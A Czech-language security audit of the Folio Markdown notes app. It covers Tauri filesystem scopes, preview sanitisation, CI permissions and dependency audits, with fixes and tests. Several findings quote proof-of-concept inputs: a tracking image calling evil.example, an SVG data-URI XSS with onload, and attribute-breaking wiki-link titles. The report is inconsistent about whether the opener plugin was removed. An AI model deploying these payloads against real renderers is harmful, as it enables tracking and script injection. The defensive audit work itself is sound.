# Bezpečnostní audit Folio

**Datum auditu:** 7. listopadu 2026  
**Verze aplikace:** 1.0.6  
**Rozsah:** desktop (Tauri 2 + WebView2), PWA (Vite build + service worker), CI/release, závislosti  
**Metodika:** adversariální přezkum zdrojů, statická analýza, `npm audit`, ruční PoC v Node/jsdom, automatizované testy v `tests/security.cjs`

---

## 1. Threat model

### Aktiva

- Obsah poznámek (`.md`) v knihovně na disku, v IndexedDB (PWA) nebo v synchronizované složce (OneDrive/iCloud).
- Nastavení aplikace (`folio-settings.json`, `localStorage`).
- Recovery journal (desktop: `$APPLOCALDATA/folio-recovery-journal.json`; PWA: omezený `localStorage`).
- Metadata vytvoření (`folio-creation-dates.json`, Tauri store).

### Aktéři

| Aktér | Schopnosti |
|--------|------------|
| **Uživatel** | Píše vlastní poznámky, otevírá náhled, volí knihovnu. |
| **Synchronizovaný útočník** | Do sdílené/sync složky vloží upravený `.md` (XSS payload, sledovací obrázek). |
| **Síťový útočník (PWA)** | Nemá přímý přístup k diskové knihovně; může lákat na škodlivý obsah v importovaném MD. |
| **Útočník s kódem v rendereru** | Při úspěšném XSS volá importované Tauri pluginy (`@tauri-apps/plugin-fs`) v desktopové verzi. |

### Hranice důvěry

- **Markdown zdroj není důvěryhodný** — každá poznámka se parsuje jako nepřátelský vstup.
- **Náhled je HTML** — musí být v sandboxu bez scriptů, bez nebezpečných URL a s minimem síťových úniků.
- **Desktop FS API** — výstup z webview nesmí získat přístup širší než knihovna + datové složky aplikace.

### Mimo rozsah (by design)

- Šifrování poznámek v klidu (plain `.md`).
- Ochrana před škodlivým obsahem v **editoru** CodeMirror (není HTML renderer).
- Kompletní izolace proti fyzickému přístupu k počítači nebo kompromitaci OS.

---

## 2. Přehled nálezů podle závažnosti

| Závažnost | Počet | Stav v PR #11 |
|-----------|------|----------------|
| Critical | 0 | — |
| High | 6 | 5 opraveno; 1 dokumentováno (code signing záměrně mimo PR) |
| Medium | 7 | 6 opraveno / zmírněno; 1 otevřeno (`unsafe-inline` CSS) |
| Low | 6 | 2 opraveno; zbytek informační |
| Info | 8 | — |

---

## 3. Nálezy

### HIGH-01 — Příliš široký Tauri `fs` scope (`$HOME/**` a další)

- **Závažnost:** High  
- **Oblast:** Eskalace webview → nativ (Tauri capabilities)

**Popis:** `src-tauri/capabilities/default.json` dříve povoloval rekurzivní čtení/zápis pod `$HOME/**`, `$DESKTOP/**`, `$DOWNLOAD/**`. Frontend přímo importuje `@tauri-apps/plugin-fs`. Jakékoli spuštění JS v rendereru (XSS nebo supply-chain v bundlu) by mohlo číst/psát velkou část profilu uživatele bez dalšího dialogu.

**PoC (konceptuální):** Po hypotetickém XSS: `import { readTextFile } from '@tauri-apps/plugin-fs'` + čtení cest v rámci `$HOME/**`.

**Dopad:** Únik citlivých souborů, přepis dat mimo knihovnu poznámek.

**Oprava (2. kolo):** Statický scope pouze `$APPDATA/**`, `$APPLOCALDATA/**`, `$APPCONFIG/**`, `$TEMP/**`. Přístup ke knihovně výhradně přes **`allow_library_path`** (Tauri command + `fs_scope().allow_directory`) volaný z `ensureLibraryFsScope()` při `openLibrary`, plus **persisted scope** po dialogu.

**Stav:** **Opraveno** (viz LOW-02).

---

### HIGH-02 — Sledovací pixely a vzdálené obrázky v náhledu (PWA)

- **Závažnost:** High (soukromí)  
- **Oblast:** XSS / síť v náhledu

**Popis:** Markdown `![track](https://útočník.example/pixel.png)` způsobí GET na server útočníka při otevření náhledu. Uživatel nekliká na odkaz; stačí syncovaný soubor.

**PoC:**
```markdown
![.](./ignored)
<img src="https://evil.example/log?u=sync">
```
Po opravě DOMPurify nechá `<img src="https://...">` — síťový požadavek proběhne.

**Dopad:** Únik IP, času čtení, fingerprintu klienta; korelace s identitou při opakovaném čtení.

**Oprava:** Vzdálené `http(s)` obrázky v náhledu jsou **ve výchozím stavu zablokované** (placeholder + `preview-img-placeholder`). Uživatel může zapnout načítání **globálně** nebo **pro aktuální poznámku** (tlačítka v liště náhledu, nastavení v `AppSettings`).  
**Test:** `tests/security.cjs` — blokace vs. `allowRemoteImages: true`.

**Stav:** **Opraveno** (uživatelsky volitelné zapnutí).

---

### HIGH-03 — Nebezpečné `data:` URI (SVG) v `<img>`

- **Závažnost:** High (historicky kritické v některých engine; dnes spíše obrana v hloubce)  
- **Oblast:** XSS v náhledu

**Popis:** Původní DOMPurify konfigurace propouštěla  
`<img src="data:image/svg+xml,<svg onload=alert(1)>">`.

**PoC:** Vložit výše do `.md`, zapnout Preview.

**Dopad:** Potenciální spuštění skriptu v zastaralém WebView; v moderních prohlížečích často omezeno, ale nesmíme na to spoléhat.

**Oprava:** `src/lib/safeUrl.ts` + hook `afterSanitizeAttributes` v `src/lib/preview.ts` — blok `data:image/svg`, `data:text/`, `javascript:`, `file:`.

**Test:** `tests/security.cjs` (OWASP vektory).

---

### HIGH-04 — Nepoužívaný plugin `opener` v capabilities

- **Závažnost:** High (šíření attack surface)  
- **Oblast:** Tauri

**Popis:** `tauri-plugin-opener` byl aktivní s `opener:default`, aplikace ho z TypeScriptu nevolá.

**Dopad:** Po XSS další IPC plocha (otevírání URL/aplikací).

**Oprava:** Odstraněn z `lib.rs`, `Cargo.toml`, `capabilities`, `package.json`.

---

### HIGH-05 — Únik obsahu přes recovery journal (`localStorage`)

- **Závažnost:** High (lokální soukromí)  
- **Oblast:** Filesystem / úložiště

**Popis:** `src/lib/drafts.ts` ukládá **plný text** rozpracované poznámky do `localStorage` pod klíčem `folio.draft.v1:<path>`.

**PoC:** Na sdíleném PC otevřít DevTools → Application → Local Storage.

**Dopad:** Čtení poznámek bez otevření souboru; perzistence po zavření aplikace.

**Oprava:** Desktop journal v `$APPLOCALDATA/folio-recovery-journal.json` (limity `MAX_DRAFT_BYTES` / `MAX_DRAFTS_TOTAL_BYTES`); migrace z `localStorage` při startu; po úspěšném uložení `forgetDraft(path, text)` journal smaže. PWA zůstává v `localStorage` s limity.  
**Test:** `tests/security.cjs` — limity a migrace.

**Stav:** **Opraveno** na desktopu; PWA journal stále v prohlížeči (viz LOW-01).

---

### HIGH-06 — CI: job Windows s `contents: write` a automatický release

- **Závažnost:** High (supply chain / CI)  
- **Oblast:** GitHub Actions (`.github/workflows/folio.yml`)

**Popis:** Job `windows` na `main`/PR má `permissions: contents: write` a publikuje instalátor přes `softprops/action-gh-release@v2`.

**PoC:** Kompromitace workflow nebo závislosti v CI → zápis release artefaktů.

**Dopad:** Distribuce malwaru podepsaného projektem.

**Oprava:** Job rozdělen na `windows-build` (`contents: read`) a `windows-release` (`contents: write`, pouze push na `main`). Akce pinned na commit SHA.  
**Stav:** **Opraveno** (release permissions). **Code signing** zůstává **otevřeno** — mimo tento PR dle vlastníka.

---

### MEDIUM-01 — Protokoly `//` a nefiltrované odkazy v náhledu

- **Závažnost:** Medium  
- **Oblast:** XSS / navigace

**Popis:** Odkazy `//evil.example` procházely do DOM.

**Oprava:** `isSafePreviewLinkHref` + post-processing v DOMPurify hooku.

---

### MEDIUM-02 — Import akceptoval libovolné `text/*`

- **Závažnost:** Medium  
- **Oblast:** Import souborů

**Popis:** `importMarkdownFiles` brala soubory s MIME `text/*`, ne jen `.md`.

**Oprava:** Pouze `\.md$` v názvu souboru.

---

### MEDIUM-03 — Wiki odkazy a HTML metaznaky v titulku

- **Závažnost:** Medium  
- **Oblast:** Wiki link rendering

**Popis:** Titulky `[[x"><img>|y]]` mohly po parsování Marked/DOMPurify vést k rozbití atributu `data-wiki-title` (viz test před opravou).

**Oprava:** Tokenizer wiki odkazů omezen na `[^\]|#<>"&\n]+` v `preview.ts` a `noteIndex.ts`.

---

### MEDIUM-04 — `style-src 'unsafe-inline'` (Tauri CSP)

- **Závažnost:** Medium (omezené)  
- **Oblast:** CSP

**Popis:** Inline styly v CSP usnadňují CSS injection, pokud by proklouzl tag `style` (aktuálně `FORBID_TAGS`).

**Stav:** **Otevřeno** — refaktor CSS bez inline.

---

### MEDIUM-05 — Transitive `npm audit` (high)

- **Závažnost:** Medium (build/CI)  
- **Oblast:** Supply chain

**Popis:** `npm audit` hlásí high u `nanoid`, `source-map-js` (transitivně přes Vite/jsdom). Runtime Folio v produkčním bundlu je minimální; riziko hlavně při `npm ci` / vývoji.

**Oprava:** `npm audit fix` (lockfile); CI krok `npm audit --audit-level=high` v jobu `web`. K datu druhého kola: **0 high/critical** v `npm audit` po `npm ci`.  
**Stav:** **Opraveno** (průběžný dohled v CI).

---

### MEDIUM-06 — Chybí `cargo audit` v CI

- **Závažnost:** Medium  
- **Oblast:** Rust závislosti

**Popis:** `cargo audit` na agentovi není nainstalován; workflow neobsahuje audit Rust lockfile.

**Oprava:** Job `cargo-audit` v `.github/workflows/folio.yml`.  
**Stav:** **Opraveno** (výsledek závisí na Rust advisories v `Cargo.lock`).

---

### MEDIUM-07 — Release bez dokumentovaného code signing

- **Závažnost:** Medium  
- **Oblast:** Windows installer

**Popis:** NSIS instalátor nemá v repu popsaný Authenticode podpis; uživatel spoléhá na HTTPS z GitHubu.

**Stav:** **Otevřeno** — podpis + transparentní hash v release notes.

---

### LOW-01 — IndexedDB bez šifrování (PWA)

- **Závažnost:** Low  
- **Oblast:** PWA storage

**Popis:** `folio-notes` v IndexedDB — plaintext.

**Dopad:** Přístup k profilu prohlížeče = čtení knihovny.

**Doporučení:** Informovat uživatele; šifrování mimo rozsah.

---

### LOW-02 — `$DOCUMENT/**` scope na desktopu

- **Závažnost:** Low (po HIGH-01)  
- **Oblast:** Tauri FS

**Popis:** Dříve statické `$DOCUMENT/**`.

**Oprava:** Odebráno z capabilities; runtime `allow_library_path` + persisted scope při výběru složky.  
**Stav:** **Opraveno**.

---

### LOW-03 — ZIP import není implementován

- **Závažnost:** Low  
- **Oblast:** ZIP

**Popis:** Export používá `fflate` `zipSync`; import ZIP chybí. Riziko zip-slip/zip bomb vznikne až při budoucí funkci.

**Oprava (připraveno):** `src/lib/zipPaths.ts` + testy zip-slip a limit velikosti.

---

### LOW-04 — Symlinky mimo scope

- **Závažnost:** Low  
- **Oblast:** Filesystem

**Popis:** Tauri FS dokumentace: symlinky mimo scope jsou odmítnuty. Knihovna na sync složce s symlinkem mimo knihovnu by neměla číst cíl.

**Doporučení:** Manuální test na Windows s junction/symlink.

---

### LOW-05 — DoS velkou knihovnou / velkým MD

- **Závažnost:** Low  
- **Oblast:** Dostupnost

**Popis:** `refreshLibrary` načte všechny poznámky do indexu backlinků.

**Doporučení:** Limit velikosti souboru / lazy index.

---

### LOW-06 — Globální CSP PWA stále povoluje `https:` obrázky

- **Závažnost:** Low (soukromí)  
- **Oblast:** PWA CSP (`index.html`)

**Popis:** `img-src ... https: http:` — konzistentní s legitimním Markdownem, ale umožňuje HIGH-02.

**Stav:** Viz HIGH-02.

---

### INFO-01 — Telemetrie

Žádné volání analytics v `src/`; service worker neposílá data mimo origin.

### INFO-02 — Auto-updater

V `tauri.conf.json` není `updater` — žádné silent update.

### INFO-03 — `withGlobalTauri: false`

Globální Tauri API není vystaveno; přímé importy pluginů zůstávají.

### INFO-04 — DOMPurify + zakázané tagy

`iframe`, `script`, `form` odstraněny v testech i konfiguraci.

### INFO-05 — Atomic save

`.folio-<uuid>.tmp` + `rename` v `fs-tauri.ts` — mitigace ztráty při přerušení zápisu.

### INFO-06 — Path traversal v názvech souborů

`safeNoteTitle` odstraňuje `..`, `\`, `/`; `assertSafeRelativeNotePath` při exportu do složky.

### INFO-07 — GitHub Actions: kořenové `permissions: contents: read`

Job `web` nemá write.

### INFO-08 — Lockfiles

`package-lock.json` + `Cargo.lock` v repu; po auditu aktualizován Cargo lock (odstraněn opener).

---

## 4. Oblasti přezkumu — shrnutí

| Oblast | Závěr |
|--------|--------|
| **XSS / náhled** | DOMPurify + URL hooky; **vzdálené obrázky default off**; testy OWASP. |
| **Webview → nativ** | FS scope jen app data + **runtime knihovna**; `opener` jen na `https://github.com/samwe20/Folio/releases/**`. |
| **Filesystem** | Atomic save OK; traversal v relativních cestách kontrolován při zápisu do složky. |
| **PWA** | CSP meta v `index.html`; SW jen same-origin GET; IndexedDB plaintext. |
| **ZIP** | Pouze export; připraveny validátory pro budoucí import. |
| **Supply chain** | `npm audit --audit-level=high` + job `cargo-audit` v CI. |

---

### INFO-09 — Kontrola aktualizací (1.0.6+)

Desktop **max. jednou za 24 h** načte `GET https://api.github.com/repos/samwe20/Folio/releases/latest` (CSP `connect-src` + stejná doména v Tauri CSP). Žádná autentizace, krátký timeout, při chybě tichý návrat. Zobrazí jen porovnání tagu `folio-X.Y.Z` s lokální verzí; tlačítko **Stáhnout** otevře ověřené `html_url` release v systémovém prohlížeči. Žádná automatická instalace ani další síťová telemetrie.

---

## 5. Automatizované testy

- `tests/security.cjs` — XSS, blokace vzdálených obrázků, journal, zip-slip, CSP.
- `tests/update-check.cjs` — semver, URL validace, logika update nabídky.
- `npm test` spouští `regression.cjs` + `security.cjs` + `update-check.cjs` (CI job `web`).

---

## 6. Co zůstává na rozhodnutí vlastníka

1. **MEDIUM-07** — Authenticode / code signing instalátoru (záměrně mimo tento PR).  
2. **MEDIUM-04** — odstranění `style-src 'unsafe-inline'` v CSP.  
3. **LOW-01** — šifrování knihovny v IndexedDB (PWA).  
4. Recovery journal v **PWA** `localStorage` (desktop již v app data).

---

*Audit proveden v rámci větve `cursor/security-audit-1e5f`. Maintainer provede merge po vlastním review.*
